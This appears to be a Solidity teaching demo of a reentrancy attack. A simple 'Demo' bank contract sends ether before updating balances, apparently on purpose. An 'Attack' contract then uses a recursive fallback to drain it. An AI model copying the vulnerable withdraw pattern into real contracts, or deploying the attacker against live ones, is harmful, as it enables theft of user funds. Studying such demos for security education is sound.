// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

contract Demo {
    mapping(address => uint256) public balances;

    //  存款
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 取款
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Failed to send");
        balances[msg.sender] -= _amount;
    }

    /*
     * ========================================
     * Helper
     * ========================================
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Demo public demo;

    constructor(address _demoAddress) public {
        demo = Demo(_demoAddress);
    }

    fallback() external payable {
        if (address(demo).balance >= 1 ether) {
            demo.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "need 1 ether");
        demo.deposit{value: 1 ether}();
        demo.withdraw(1 ether);
    }

    /*
     * ========================================
     * Helper
     * ========================================
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}